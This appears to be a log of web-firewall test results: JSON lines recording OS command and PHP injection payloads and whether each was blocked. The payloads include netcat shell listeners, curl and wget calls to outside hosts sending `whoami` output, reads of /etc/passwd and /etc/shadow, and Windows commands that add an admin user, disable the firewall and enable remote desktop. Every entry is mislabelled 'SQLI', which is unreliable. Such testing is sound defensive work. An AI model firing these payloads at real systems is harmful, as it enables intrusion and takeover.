+{"payload": "| ls -laR /etc", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006908420997206122}
+{"payload": "; ls -laR /etc", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005782409993116744}
+{"payload": "& ls -laR /etc", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004817847991944291}
+{"payload": "&& ls -laR /etc", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004673083996749483}
+{"payload": "| ls -laR /var/www", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005891630993573926}
+{"payload": "; ls -laR /var/www", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005546308006159961}
+{"payload": "& ls -laR /var/www", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0057262190093752}
+{"payload": "&& ls -laR /var/www", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006185746009577997}
+{"payload": "| ls -l /etc/", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005308731007971801}
+{"payload": "; ls -l /etc/", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008320666995132342}
+{"payload": "& ls -l /etc/", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006369786002323963}
+{"payload": "&& ls -l /etc/", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005953155006864108}
+{"payload": "ls -l /etc/", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006573378006578423}
+{"payload": "ls -lh /etc/", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006055892008589581}
+{"payload": "| ls -l /home/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006257853994611651}
+{"payload": "; ls -l /home/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005136841005878523}
+{"payload": "& ls -l /home/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005356327994377352}
+{"payload": "&& ls -l /home/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005473982993862592}
+{"payload": "ls -l /home/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004360557999461889}
+{"payload": "*; ls -lhtR /var/www/", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004524955002125353}
+{"payload": "| ls -l /tmp", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005829346002428792}
+{"payload": "; ls -l /tmp", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005914981986279599}
+{"payload": "& ls -l /tmp", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00466160500945989}
+{"payload": "&& ls -l /tmp", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004368713998701423}
+{"payload": "ls -l /tmp", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004845711009693332}
+{"payload": "| ls -l /var/www/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004742602992337197}
+{"payload": "; ls -l /var/www/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0050124870031140745}
+{"payload": "& ls -l /var/www/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005157213992788456}
+{"payload": "&& ls -l /var/www/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006359965991578065}
+{"payload": "ls -l /var/www/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006123518003732897}
+{"payload": "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006075359997339547}
+{"payload": "<!--#exec cmd=\"/bin/cat /etc/shadow\"-->", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005049993997090496}
+{"payload": "<!--#exec cmd=\"/usr/bin/id;-->", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035789750108961016}
+{"payload": "\\n", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01603657499072142}
+{"payload": "\\n\\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\\`whoami\\`", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0062345559999812394}
+{"payload": "\\n\\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\\`whoami\\`", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006160061995615251}
+{"payload": "\\n/bin/ls -al\\n", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004730924003524706}
+{"payload": "| nc -lvvp 4444 -e /bin/sh|", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004517044988460839}
+{"payload": "; nc -lvvp 4444 -e /bin/sh;", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005022715995437466}
+{"payload": "& nc -lvvp 4444 -e /bin/sh&", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004620253006578423}
+{"payload": "&& nc -lvvp 4444 -e /bin/sh &", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005252799004665576}
+{"payload": "nc -lvvp 4444 -e /bin/sh", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006243352007004432}
+{"payload": "nc -lvvp 4445 -e /bin/sh &", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004886859009275213}
+{"payload": "nc -lvvp 4446 -e /bin/sh|", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005597066003247164}
+{"payload": "nc -lvvp 4447 -e /bin/sh;", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0057693620037753135}
+{"payload": "nc -lvvp 4448 -e /bin/sh&", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004110813999432139}
+{"payload": "\\necho INJECTX\\nexit\\n\\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\\n", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014473975999862887}
+{"payload": "\\necho INJECTX\\nexit\\n\\033[2Asleep 5\\n", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013974836008856073}
+{"payload": "\\necho INJECTX\\nexit\\n\\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\\n", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014023219991941005}
+{"payload": "| net localgroup Administrators hacker /ADD", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0049643240054138005}
+{"payload": "; net localgroup Administrators hacker /ADD", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004832709004404023}
+{"payload": "& net localgroup Administrators hacker /ADD", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004812075989320874}
+{"payload": "&& net localgroup Administrators hacker /ADD", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005008859006920829}
+{"payload": "net localgroup Administrators hacker /ADD", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01749669799755793}
+{"payload": "| netsh firewall set opmode disable", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005451826000353321}
+{"payload": "; netsh firewall set opmode disable", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005448936004540883}
+{"payload": "& netsh firewall set opmode disable", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005640898991259746}
+{"payload": "&& netsh firewall set opmode disable", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0045415159984258935}
+{"payload": "netsh firewall set opmode disable", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.02549431100487709}
+{"payload": "netstat", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.019524956995155662}
+{"payload": ";netstat -a;", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005560650999541394}
+{"payload": "| netstat -an", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005406383002991788}
+{"payload": "; netstat -an", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0068490669946186244}
+{"payload": "& netstat -an", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005315859991242178}
+{"payload": "&& netstat -an", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006727031999616884}
+{"payload": "netstat -an", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005215176002820954}
+{"payload": "| net user hacker Password1 /ADD", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005287564999889582}
+{"payload": "; net user hacker Password1 /ADD", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.01050420400861185}
+{"payload": "& net user hacker Password1 /ADD", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.010358086990891024}
+{"payload": "&& net user hacker Password1 /ADD", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.013023300998611376}
+{"payload": "net user hacker Password1 /ADD", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.022825992011348717}
+{"payload": "| net view", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006007067990140058}
+{"payload": "; net view", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006594092003069818}
+{"payload": "& net view", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00748374400427565}
+{"payload": "&& net view", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005329424995579757}
+{"payload": "net view", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.021367252003983594}
+{"payload": "\\nid|", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.018474247000995092}
+{"payload": "\\nid;", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01530481300142128}
+{"payload": "\\nid\\n", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014120446008746512}
+{"payload": "\\n/usr/bin/id\\n", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0040995559975272045}
+{"payload": "perl -e 'print \"X\"x1024'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004572566002025269}
+{"payload": "|| perl -e 'print \"X\"x16096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00446946699230466}
+{"payload": "| perl -e 'print \"X\"x16096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004163960998994298}
+{"payload": "; perl -e 'print \"X\"x16096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003621272000600584}
+{"payload": "& perl -e 'print \"X\"x16096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005010332999518141}
+{"payload": "&& perl -e 'print \"X\"x16096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006944000007933937}
+{"payload": "perl -e 'print \"X\"x16384'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007246010005474091}
+{"payload": "; perl -e 'print \"X\"x2048'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004973221002728678}
+{"payload": "& perl -e 'print \"X\"x2048'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00531919598870445}
+{"payload": "&& perl -e 'print \"X\"x2048'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004503957999986596}
+{"payload": "perl -e 'print \"X\"x2048'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033387389994459227}
+{"payload": "|| perl -e 'print \"X\"x4096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00375502799579408}
+{"payload": "| perl -e 'print \"X\"x4096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003428381009143777}
+{"payload": "; perl -e 'print \"X\"x4096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035551449982449412}
+{"payload": "& perl -e 'print \"X\"x4096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035918350040446967}
+{"payload": "&& perl -e 'print \"X\"x4096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003663312003482133}
+{"payload": "perl -e 'print \"X\"x4096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032867489935597405}
+{"payload": "|| perl -e 'print \"X\"x8096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033726889960234985}
+{"payload": "| perl -e 'print \"X\"x8096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0045985760079929605}
+{"payload": "; perl -e 'print \"X\"x8096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004566239003906958}
+{"payload": "&& perl -e 'print \"X\"x8096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003819297009613365}
+{"payload": "perl -e 'print \"X\"x8192'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003702093003084883}
+{"payload": "perl -e 'print \"X\"x81920'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004909749011858366}
+{"payload": "|| phpinfo()", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005581349003477953}
+{"payload": "| phpinfo()", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00537773800897412}
+{"payload": "{${phpinfo()}}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005384161006077193}
+{"payload": ";phpinfo()", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005779921993962489}
+{"payload": ";phpinfo();//", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004152473993599415}
+{"payload": "';phpinfo();//", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004044299988890998}
+{"payload": "{${phpinfo()}}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034116449969587848}
+{"payload": "& phpinfo()", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035275710106361657}
+{"payload": "&& phpinfo()", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004434646005393006}
+{"payload": "phpinfo()", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003601493008318357}
+{"payload": "phpinfo();", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003490975999739021}
+{"payload": "<?php system(\"cat /etc/passwd\");?>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036594409903045744}
+{"payload": "<?php system(\"curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get\");?>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005743892994360067}
+{"payload": "<?php system(\"curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj\");?>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006586155999684706}
+{"payload": "<?php system(\"echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\");?>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00628253401373513}
+{"payload": "<?php system(\"sleep 10\");?>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006696662996546365}
+{"payload": "<?php system(\"sleep 5\");?>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005287043997668661}
+{"payload": "<?php system(\"wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get\");?>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005290080996928737}
+{"payload": "<?php system(\"wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc\");?>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004670368012739345}
+{"payload": ":phpversion();", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005900973992538638}
+{"payload": "`ping 127.0.0.1`", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004871601006016135}
+{"payload": "& ping -i 30 127.0.0.1 &", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005729405005695298}
+{"payload": "& ping -n 30 127.0.0.1 &", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0059405859938124195}
+{"payload": ";${@print(md5(RCEVulnerable))};", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00657694399706088}
+{"payload": "${@print(\"RCEVulnerable\")}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00923072500154376}
+{"payload": "${@print(system($_SERVER['HTTP_USER_AGENT']))}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006786227007978596}
+{"payload": "pwd", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.016527897998457775}
+{"payload": "| pwd", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014494190996629186}
+{"payload": "; pwd", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.017123009005445056}
+{"payload": "& pwd", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01482893800130114}
+{"payload": "&& pwd", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01717887599079404}
+{"payload": "\\r", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012685567999142222}
+{"payload": "| reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004963241997756995}
+{"payload": "; reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005672164013958536}
+{"payload": "& reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005348842998500913}
+{"payload": "&& reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0041796150035224855}
+{"payload": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01487139900564216}
+{"payload": "\\r\\n", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.022798008008976467}
+{"payload": "route", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01650285600044299}
+{"payload": "| sleep 1", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.009132717997999862}
+{"payload": "; sleep 1", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008634288009488955}
+{"payload": "& sleep 1", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.009246276007615961}
+{"payload": "&& sleep 1", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007923662997200154}
+{"payload": "sleep 1", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014298969996161759}
+{"payload": "|| sleep 10", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0041905460093403235}
+{"payload": "| sleep 10", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003830708999885246}
+{"payload": "; sleep 10", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004570611999952234}
+{"payload": "{${sleep(10)}}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006737422998412512}
+{"payload": "& sleep 10", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005420070010586642}
+{"payload": "&& sleep 10", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008247414996731095}
+{"payload": "sleep 10", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01661610401060898}
+{"payload": "|| sleep 15", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005226277993642725}
+{"payload": "| sleep 15", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005569006010773592}
+{"payload": "; sleep 15", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004836628009798005}
+{"payload": "& sleep 15", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004712709996965714}
+{"payload": "&& sleep 15", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00564792200748343}
+{"payload": "{${sleep(20)}}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005071746010798961}
+{"payload": "{${sleep(20)}}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003960614005336538}
+{"payload": "{${sleep(3)}}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006595683997147717}
+{"payload": "{${sleep(3)}}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005626722995657474}
+{"payload": "| sleep 5", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005410320998635143}
+{"payload": "; sleep 5", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004617757003870793}
+{"payload": "& sleep 5", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004883026995230466}
+{"payload": "&& sleep 5", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004180913005257025}
+{"payload": "sleep 5", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012553117994684726}
+{"payload": "{${sleep(hexdec(dechex(20)))}}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004847149000852369}
+{"payload": "{${sleep(hexdec(dechex(20)))}}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004075413002283312}
+{"payload": "sysinfo", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013914156996179372}
+{"payload": "| sysinfo", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01204374700319022}
+{"payload": "; sysinfo", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014215470000635833}
+{"payload": "& sysinfo", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.0152700260077836}
+{"payload": "&& sysinfo", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011433731007855386}
+{"payload": ";system('cat%20/etc/passwd')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004510951999691315}
+{"payload": "system('cat C:\\boot.ini');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003940305992728099}
+{"payload": "system('cat config.php');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036820749955950305}
+{"payload": "system('cat /etc/passwd');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003972177000832744}
+{"payload": "|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004610996998962946}
+{"payload": "| system('curl https://crowdshield.com/.testing/rce_vuln.txt');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0046333470090758055}
+{"payload": "; system('curl https://crowdshield.com/.testing/rce_vuln.txt');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004234570995322429}
+{"payload": "& system('curl https://crowdshield.com/.testing/rce_vuln.txt');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003555873001459986}
+{"payload": "&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004460297001060098}
+{"payload": "system('curl https://crowdshield.com/.testing/rce_vuln.txt')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006631009004195221}
+{"payload": "system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004179169001872651}
+{"payload": "system('curl https://sn1persecurity.com/.testing/rce_vuln.txt');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005838505006977357}
